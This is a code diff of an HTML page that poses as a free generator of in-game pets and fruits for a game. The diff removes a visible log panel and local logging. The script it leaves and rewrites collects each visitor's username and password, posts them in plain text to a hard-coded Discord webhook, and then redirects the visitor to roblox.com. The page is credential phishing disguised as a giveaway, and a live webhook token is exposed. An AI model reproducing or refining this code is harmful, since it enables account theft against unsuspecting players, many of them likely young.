@@ -31,7 +31,6 @@
       color: #2e7d32;
       text-shadow: 0 1px 1px rgba(255,255,255,0.6);
     }
-
     .generator {
       display: flex;
       flex-wrap: wrap;
@@ -62,10 +61,7 @@
       transition: background .2s;
     }
     .generator button:hover { background: #558b2f; }
-
-    #result {
-      margin-bottom: 2rem;
-    }
+    #result { margin-bottom: 2rem; }
     .result-card {
       display: inline-block;
       width: 100%;
@@ -82,11 +78,7 @@
       object-fit: contain;
       margin-bottom: .5rem;
     }
-    .result-card p {
-      font-size: .9rem;
-      color: #333;
-    }
-
+    .result-card p { font-size: .9rem; color: #333; }
     .browse img {
       width: 100%;
       max-width: 1200px;
@@ -94,39 +86,12 @@
       box-shadow: 0 2px 6px rgba(0,0,0,0.1);
       margin-bottom: 2rem;
     }
-
-    #logs {
-      width: 100%;
-      max-width: 800px;
-      text-align: left;
-      background: rgba(255,255,255,0.8);
-      padding: 1rem;
-      border-radius: 6px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      overflow-y: auto;
-      max-height: 200px;
-    }
-    #logs h3 {
-      margin-bottom: .5rem;
-      font-size: 1.1rem;
-      color: #2e7d32;
-    }
-    #logs p {
-      font-size: .85rem;
-      margin: .25rem 0;
-      color: #333;
-    }
-
     @media (max-width: 480px) {
       body { padding: 1rem 0; }
       header h2 { font-size: 1rem; }
       .generator input,
-      .generator button {
-        flex: 1 1 100%;
-      }
-      .result-card {
-        max-width: 100%;
-      }
+      .generator button { flex: 1 1 100%; }
+      .result-card { max-width: 100%; }
     }
   </style>
 </head>
@@ -149,76 +114,26 @@
     <div class="browse">
       <img src="image.png" alt="Browse through the available fruits and pets">
     </div>
-
-    <div id="logs">
-      <h3>Generation Logs</h3>
-      <p>No entries yet.</p>
-    </div>
   </div>
 
   <script>
-    // Constants: insert your Discord webhook and redirect URL
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1386205670910590999/d3JOVi2Rq_9KSePdSak_X-TAb-N8hijxdBg92wX4pI1esAk3nHPwMIrqaaOl3S4Mx_tc';
-    const REDIRECT_URL = 'https://www.roblox.com/'; // e.g. Discord channel or any link you want users to visit
+    const REDIRECT_URL = 'https://www.roblox.com/';
 
     const items = [
-      { name: 'Disco Bee',      img: 'disco-bee.png' },
-      { name: 'Raccoon Pet',    img: 'raccoon.png' },
-      { name: 'Mimic Octopus',  img: 'mimic-octopus.png' },
+      { name: 'Disco Bee', img: 'disco-bee.png' },
+      { name: 'Raccoon Pet', img: 'raccoon.png' },
+      { name: 'Mimic Octopus', img: 'mimic-octopus.png' },
       /* ... other items ... */
-      { name: 'Grape',          img: 'grape.png' }
+      { name: 'Grape', img: 'grape.png' }
     ];
-
-    function renderLogs() {
-      const logsContainer = document.getElementById('logs');
-      const stored = JSON.parse(localStorage.getItem('generationLogs')) || [];
-      if (!stored.length) {
-        logsContainer.innerHTML = '<h3>Generation Logs</h3><p>No entries yet.</p>';
-        return;
-      }
-      const entries = stored.map(e => `<p>[${e.timestamp}] ${e.user} (${e.password}) → ${e.choice}</p>`).join('');
-      logsContainer.innerHTML = `<h3>Generation Logs</h3>${entries}`;
-    }
-
-    async function logEvent(user, choice, password) {
-      const timestamp = new Date().toISOString();
-      const entry = { user, password, choice: choice.name, timestamp };
-      console.log('Generation Event:', entry);
-
-      // LocalStorage
-      const logs = JSON.parse(localStorage.getItem('generationLogs')) || [];
-      logs.push(entry);
-      localStorage.setItem('generationLogs', JSON.stringify(logs));
-      renderLogs();
-
-      // Server
-      fetch('/api/log', {
-        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(entry)
-      }).catch(err => console.warn('Failed to log to server:', err));
-
-      // Discord Embed
-      const discordPayload = {
-        embeds: [{
-          title: '🎉 New Generation Event',
-          fields: [
-            { name: 'User',     value: user,         inline: true },
-            { name: 'Password', value: password,     inline: true },
-            { name: 'Choice',   value: choice.name,  inline: true },
-            { name: 'Time',     value: timestamp,    inline: false }
-          ],
-          color: 0x66bb6a
-        }]
-      };
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(discordPayload)
-      }).catch(err => console.warn('Failed to send to Discord:', err));
-    }
 
     document.getElementById('generate-btn').addEventListener('click', () => {
       const user = document.getElementById('username').value.trim();
       const pass = document.getElementById('password').value;
       if (!user) return alert('Please enter your username.');
       if (!pass) return alert('Please enter your password.');
+
       const choice = items[Math.floor(Math.random() * items.length)];
       document.getElementById('result').innerHTML = `
         <div class="result-card">
@@ -227,14 +142,30 @@
         </div>
       `;
 
-      // Log and then redirect
-      logEvent(user, choice, pass).finally(() => {
+      // Send event to Discord webhook
+      const payload = {
+        embeds: [{
+          title: '🎉 New Generation Event',
+          fields: [
+            { name: 'User', value: user, inline: true },
+            { name: 'Password', value: pass, inline: true },
+            { name: 'Choice', value: choice.name, inline: true },
+            { name: 'Time', value: new Date().toISOString(), inline: false }
+          ],
+          color: 0x66bb6a
+        }]
+      };
+
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .catch(err => console.warn('Discord webhook failed:', err))
+      .finally(() => {
         window.location.href = REDIRECT_URL;
       });
     });
-
-    // Initial
-    renderLogs();
   </script>
 </body>
 </html>
